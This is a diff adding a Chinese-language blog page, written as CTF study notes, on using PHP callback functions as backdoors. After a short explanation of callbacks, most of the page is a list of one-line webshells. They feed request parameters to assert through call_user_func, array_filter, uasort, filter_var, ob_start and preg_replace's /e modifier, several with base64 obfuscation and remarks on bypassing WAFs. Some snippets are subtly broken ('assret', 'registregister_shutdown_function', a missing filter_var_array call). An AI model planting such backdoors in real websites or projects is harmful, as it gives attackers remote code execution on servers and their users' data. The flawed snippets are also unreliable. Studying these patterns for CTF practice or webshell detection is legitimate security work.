@@ -1,0 +1,190 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="因为在ISCC中遇到了回调函数的利用；之前在校赛时也遇到了所以此时来学习一下php的回调函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP回调函数(Callback)">
+<meta property="og:url" content="https://hyggevv.github.io/2023/05/05/php%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/index.html">
+<meta property="og:site_name" content="hey&#39;s blog">
+<meta property="og:description" content="因为在ISCC中遇到了回调函数的利用；之前在校赛时也遇到了所以此时来学习一下php的回调函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-05-05T10:06:06.000Z">
+<meta property="article:modified_time" content="2023-05-05T13:30:05.290Z">
+<meta property="article:author" content="hey">
+<meta name="twitter:card" content="summary"><title>PHP回调函数(Callback) | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/05/05/php%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">PHP回调函数(Callback)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-05-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-05-05</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p>前言：这些回调函数经过测试，在php版本不匹配的情况下有些回调函数是无法运行的</p>
+
+        <h2 id="Here-we-go">
+          <a href="#Here-we-go" class="heading-link"><i class="fas fa-link"></i></a><a href="#Here-we-go" class="headerlink" title="Here we go"></a>Here we go</h2>
+      
+        <h2 id="什么是回调函数">
+          <a href="#什么是回调函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是回调函数" class="headerlink" title="什么是回调函数"></a>什么是回调函数</h2>
+      <p>回调函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">回调函数:Callback(即call then back被主函数调用运算之后还会返回到主函数)；是指被函数参数传递到其他代</span><br><span class="line">码中执行，某一块可执行代码的引用</span><br></pre></td></tr></table></div></figure>
+<p>回调函数就是将一个函数作为参数；然后传递到另一个函数中的函数。php中有许多这样的函数，比如call_user_func , call_user_func_array,array_map等等。此时会将函数作为参数调用执行后返回主函数。既然回调函数可<br>以将函数作为参数传入另一个函数进行执行然后回调到主函数；那么我们此时便可以将一些危险函数比如eval函数或者system函数作为参数传入进行RCE;这也是我们在比赛中遇到回调函数的一种思路</p>
+
+        <h2 id="回调与直掉">
+          <a href="#回调与直掉" class="heading-link"><i class="fas fa-link"></i></a><a href="#回调与直掉" class="headerlink" title="回调与直掉"></a>回调与直掉</h2>
+      <p>可能光看定义的话还是无法理解；那么此时我们来借助直掉函数与回调函数例子的一个比较来加深我们对回调函数的理解<br>直掉函数：直接运行一个函数便是直调</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function hello()&#123;</span><br><span class="line">  echo &quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hello(); </span><br></pre></td></tr></table></div></figure>
+<p>此时直接调用hello()函数；并没有将hello()作为一个参数传入另一个函数；此时我们便可以称其为直掉</p>
+<p>回调函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function run($func, $param)&#123;</span><br><span class="line">    call_user_func($func, $param);</span><br><span class="line">    echo &quot;Run done!&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function hello($param)&#123;</span><br><span class="line">    echo &quot;hello&quot;.$param.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">run(&quot;hello&quot;, 1);</span><br></pre></td></tr></table></div></figure>
+<p>此时我们可以看到定义了两个函数；分别是run()和hello()；此时的hello()函数便作为参数传入到run()函数之中被其调用执行；此时我们将hello()称为回调函数；run()称为中间函数；此时的回调是通过call_user_func()<br>来实现的。</p>
+
+        <h2 id="回调函数的后门">
+          <a href="#回调函数的后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#回调函数的后门" class="headerlink" title="回调函数的后门"></a>回调函数的后门</h2>
+      
+        <h2 id="1-call-user-func">
+          <a href="#1-call-user-func" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-call-user-func" class="headerlink" title="1.call_user_func"></a>1.call_user_func</h2>
+      <p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] ):此时第一个参<br>数$callback作为回调函数；其余的作为回调函数的参数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;wann&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>此时便是将assert作为回调函数；然后wann作为回调函数中的参数进行回调</p>
+
+        <h2 id="2-call-user-func-array">
+          <a href="#2-call-user-func-array" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-call-user-func-array" class="headerlink" title="2.call_user_func_array()"></a>2.call_user_func_array()</h2>
+      <p>mixed call_user_func_array ( callable $callback , array $param_arr )：此时还是将第一个参数$callb<br>ack作为回调函数；然后将参数数组$param_arr作为回调函数的参数进行传入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  call_user_func_array(&#x27;assret&#x27;,$_GET[&#x27;wann&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>此时还是将assert作为回调函数；然后wann[]数组作为回调函数的参数进行回调</p>
+
+        <h2 id="单参数回调后门">
+          <a href="#单参数回调后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#单参数回调后门" class="headerlink" title="单参数回调后门"></a>单参数回调后门</h2>
+      
+        <h2 id="1-array-filter等数组操作函数">
+          <a href="#1-array-filter等数组操作函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-array-filter等数组操作函数" class="headerlink" title="1.array_filter等数组操作函数"></a>1.array_filter等数组操作函数</h2>
+      <p>array_filter ( array $array [, callable $callback [, int $flag &#x3D; 0 ]] ):此时会将数组中的元素遍历<br>给回调函数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">array_filter($arr = array($_POST[&#x27;hey&#x27;],),base64_decode($_GET[&#x27;wann&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>同样作为后门的数组操作函数还有</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array_filter($arr = array($_POST[&#x27;hey&#x27;],),base64_decode($_REQUEST[&#x27;wann&#x27;]));</span><br><span class="line">array_walk($arr = array($_POST[&#x27;hey&#x27;],),base64_decode($_REQUEST[&#x27;wann&#x27;]));</span><br><span class="line">array_walk_recursive($arr = array($_POST[&#x27;hey&#x27;],),base64_decode($_REQUEST[&#x27;wann&#x27;]));</span><br><span class="line">array_map(base64_decode($_REQUEST[&#x27;hey&#x27;]),$arr = array($_POST[&#x27;wann&#x27;],));</span><br></pre></td></tr></table></div></figure>
+<p>这些函数都是将数组遍历作为参数传递给回调函数</p>
+
+        <h2 id="2-registregister-shutdown-function">
+          <a href="#2-registregister-shutdown-function" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-registregister-shutdown-function" class="headerlink" title="2.registregister_shutdown_function"></a>2.registregister_shutdown_function</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">registregister_shutdown_function(base64_decode($_GET[&#x27;hey&#x27;]),$_GET[&#x27;wann&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>此时依旧是将参数wann作为回调函数hey的参数进行执行</p>
+
+        <h2 id="3-register-tick-function">
+          <a href="#3-register-tick-function" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-register-tick-function" class="headerlink" title="3.register_tick_function"></a>3.register_tick_function</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">declare(ticks=1);</span><br><span class="line">register_tick_function (base64_decode($_GET[&#x27;hey&#x27;]), $_GET[&#x27;wann&#x27;]);</span><br></pre></td></tr></table></div></figure>
+<p>这里的declare函数是用于设定时钟周期ticks值的函数,而register_tick_function函数是依据ticks的值运行的</p>
+
+        <h2 id="4-filter-var">
+          <a href="#4-filter-var" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-filter-var" class="headerlink" title="4.filter_var"></a>4.filter_var</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">filter_var($_REQUEST[&#x27;pass&#x27;], FILTER_CALLBACK, array(&#x27;options&#x27; =&gt; &#x27;assert&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="5-filter-var-array">
+          <a href="#5-filter-var-array" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-filter-var-array" class="headerlink" title="5.filter_var_array"></a>5.filter_var_array</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">(array(&#x27;test&#x27; =&gt; $_REQUEST[&#x27;pass&#x27;]), array(&#x27;test&#x27; =&gt; array(&#x27;filter&#x27; =&gt; FILTER_CALLBACK, &#x27;options&#x27; =&gt; &#x27;assert&#x27;)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>这两个是filter_var的利用，php里用这个函数来过滤数组，只要指定过滤方法为回调(FILTER_CALLBACK);并且op<br>tions的值为assert即可</p>
+
+        <h2 id="双参数回调后门">
+          <a href="#双参数回调后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#双参数回调后门" class="headerlink" title="双参数回调后门"></a>双参数回调后门</h2>
+      
+        <h2 id="1-assert">
+          <a href="#1-assert" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-assert" class="headerlink" title="1.assert"></a>1.assert</h2>
+      <p>assert在php手册中的定义十分简单：检查一个断言是否为FALSE。<br>assert是一个可以用于debug的函数，会将传入的字符串作为PHP代码执行，也可以作为一个后门函数使用，同时也可以作为一个回调函数使用，于是来看看assert作为回调函数时的参数。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回调函数应该接受三个参数。 第一个参数包括了断言失败所在的文件。 第二个参数包含了断言失败所在的行号，第三个参数包含了失败的表达式（如有任意 — 字面值例如 1 或者 “two” 将不会传递到这个参数）。 PHP 5.4.8 及更高版本的用户也可以提供第四个可选参数，如果设置了，用于将 description 指定到 assert()。</span><br></pre></td></tr></table></div></figure>
+<p>实际上在使用回调函数时只需传入两个参数即可以使assert()成功执行PHP代码，所以使用传递两个参数的回调函数也可调用assert(),更容易绕过waf了。<br>! PHP 5.4.8 版本及其以上 !</p>
+
+        <h2 id="2-uasort">
+          <a href="#2-uasort" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-uasort" class="headerlink" title="2.uasort"></a>2.uasort</h2>
+      <p>PHP 4, PHP 5, PHP 7<br>uasort — 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">uasort($arr = array(&#x27;&#x27;,$_REQUEST[&#x27;a&#x27;]),base64_decode($_REQUEST[&#x27;e&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>此时的回调函数可以传递两个参数；所以此时构造一个回调后门</p>
+
+        <h2 id="3-uksort">
+          <a href="#3-uksort" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-uksort" class="headerlink" title="3.uksort"></a>3.uksort</h2>
+      <p>PHP 4, PHP 5, PHP 7<br>uksort — 使用用户自定义的比较函数对数组中的键名进行排序</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">uksort($arr =array(&#x27;&#x27; =&gt; 1 ,$_REQUEST[&#x27;a&#x27;] =&gt; 2),base64_decode($_REQUEST[&#x27;e&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>此时依旧可以传递两个参数；我们依旧可以构造回调后门</p>
+
+        <h2 id="4-array-reduce">
+          <a href="#4-array-reduce" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-array-reduce" class="headerlink" title="4.array_reduce"></a>4.array_reduce</h2>
+      <p>PHP 4 &gt;&#x3D; 4.0.5, PHP 5, PHP 7<br>array_reduce — 用回调函数迭代地将数组简化为单一的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">array_reduce($arr = array(&#x27;&#x27;), base64_decode($_REQUEST[&#x27;e&#x27;]), $_REQUEST[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="5-array-udiff">
+          <a href="#5-array-udiff" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-array-udiff" class="headerlink" title="5.array_udiff"></a>5.array_udiff</h2>
+      <p>PHP 5, PHP 7<br>array_udiff — 用回调函数比较数据来计算数组的差集</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">array_udiff($arr=array($_REQUEST[&#x27;a&#x27;]),$arr1 = array(&#x27;&#x27;),base64_decode($_REQUEST[&#x27;e&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="三参数回调后门">
+          <a href="#三参数回调后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#三参数回调后门" class="headerlink" title="三参数回调后门"></a>三参数回调后门</h2>
+      
+        <h2 id="1-preg-replace">
+          <a href="#1-preg-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-preg-replace" class="headerlink" title="1.preg_replace "></a>1.preg_replace </h2>
+      <p>(PHP 4, PHP 5, PHP 7)<br>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></div></figure>
+<p>搜索subject中匹配pattern的部分，以replacement进行替换。看上去一个人畜无害的函数，然而其中的pattern函数可以使用PCRE修饰符，其中的&#x2F;e修饰符，按照PHP手册中的定义,如果设置了这个被弃用的修饰符则会在<br>preg_replace() 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php代码评估执行(eval 函数方式)，并使用执行结果作为实际参与替换的字符串。单引号、双引号、反斜线()和NULL字符在后向引用替换时会被用反斜线转义.<br>意味着当进行正则替换时使用该修饰符既可以将替换的字符串作为PHP代码执行，所以这个危险的修饰符在PHP7中被移除。<br>然而在PHP7之前的版本依然可以使用，所以找一个可以传递三个参数回调函数的函数。</p>
+
+        <h2 id="2-array-walk">
+          <a href="#2-array-walk" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-array-walk" class="headerlink" title="2.array_walk()"></a>2.array_walk()</h2>
+      <p>(PHP 4, PHP 5, PHP 7)<br>array_walk — 使用用户自定义函数对数组中的每个元素做回调处理</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )</span><br></pre></td></tr></table></div></figure>
+<p>callback:典型情况下 callback 接受两个参数。array 参数的值作为第一个，键名作为第二个。<br>userdata:如果提供了可选参数 userdata，将被作为第三个参数传递给 callback funcname。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">array_walk($arr = array($_POST[&#x27;a&#x27;] =&gt; &#x27;|.*|e&#x27;,),base64_decode($_REQUEST[&#x27;e&#x27;]),&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="3-array-walk-recursive">
+          <a href="#3-array-walk-recursive" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-array-walk-recursive" class="headerlink" title="3.array_walk_recursive()"></a>3.array_walk_recursive()</h2>
+      <p>(PHP 5, PHP 7)<br>array_walk_recursive — 对数组中的每个成员递归地应用用户函数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )</span><br></pre></td></tr></table></div></figure>
+<p>callback:典型情况下 callback 接受两个参数。array 参数的值作为第一个，键名作为第二个。<br>userdata:如果提供了可选参数 userdata，将被作为第三个参数传递给 callback。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">array_walk_recursive($arr = array($_POST[&#x27;a&#x27;] =&gt; &#x27;|.*|e&#x27;,), base64_decode($_REQUEST[&#x27;e&#x27;]),&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="无回显回调函数">
+          <a href="#无回显回调函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#无回显回调函数" class="headerlink" title="无回显回调函数"></a>无回显回调函数</h2>
+      
+        <h2 id="1-ob-start">
+          <a href="#1-ob-start" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ob-start" class="headerlink" title="1.ob_start "></a>1.ob_start </h2>
+      <p>PHP 4, PHP 5, PHP 7<br>ob_start — 打开输出控制缓</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start(&#x27;assert&#x27;);</span><br><span class="line">echo $_REQUEST[&#x27;a&#x27;];</span><br><span class="line">ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+<p>ob_start函数可以用来打开输出缓冲，配合ob_end_flush()可以将存储在内部缓冲区中的内容输出给回调函数，然而这里的回调函数执行是没有回显的，但是我们可以通过这个函数写入一些后门文件，从而达到添加webshell的意图。</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/05/05/php%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">https://hyggevv.github.io/2023/05/05/php%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/05/05/%E8%AE%B0%E5%BD%95%E5%87%A0%E9%A2%98%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">记录几题比较有意思的反序列化题目</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/05/01/%E5%88%9D%E6%8E%A2python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="paginator-prev__text">初探pickle反序列化</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Here-we-go"><span class="toc-number">1.</span> <span class="toc-text">
+          Here we go</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">
+          什么是回调函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E4%B8%8E%E7%9B%B4%E6%8E%89"><span class="toc-number">3.</span> <span class="toc-text">
+          回调与直掉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%90%8E%E9%97%A8"><span class="toc-number">4.</span> <span class="toc-text">
+          回调函数的后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-call-user-func"><span class="toc-number">5.</span> <span class="toc-text">
+          1.call_user_func</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-call-user-func-array"><span class="toc-number">6.</span> <span class="toc-text">
+          2.call_user_func_array()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E5%8F%82%E6%95%B0%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="toc-number">7.</span> <span class="toc-text">
+          单参数回调后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-array-filter%E7%AD%89%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">8.</span> <span class="toc-text">
+          1.array_filter等数组操作函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-registregister-shutdown-function"><span class="toc-number">9.</span> <span class="toc-text">
+          2.registregister_shutdown_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-register-tick-function"><span class="toc-number">10.</span> <span class="toc-text">
+          3.register_tick_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-filter-var"><span class="toc-number">11.</span> <span class="toc-text">
+          4.filter_var</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-filter-var-array"><span class="toc-number">12.</span> <span class="toc-text">
+          5.filter_var_array</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%8F%82%E6%95%B0%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="toc-number">13.</span> <span class="toc-text">
+          双参数回调后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-assert"><span class="toc-number">14.</span> <span class="toc-text">
+          1.assert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-uasort"><span class="toc-number">15.</span> <span class="toc-text">
+          2.uasort</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-uksort"><span class="toc-number">16.</span> <span class="toc-text">
+          3.uksort</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-array-reduce"><span class="toc-number">17.</span> <span class="toc-text">
+          4.array_reduce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-array-udiff"><span class="toc-number">18.</span> <span class="toc-text">
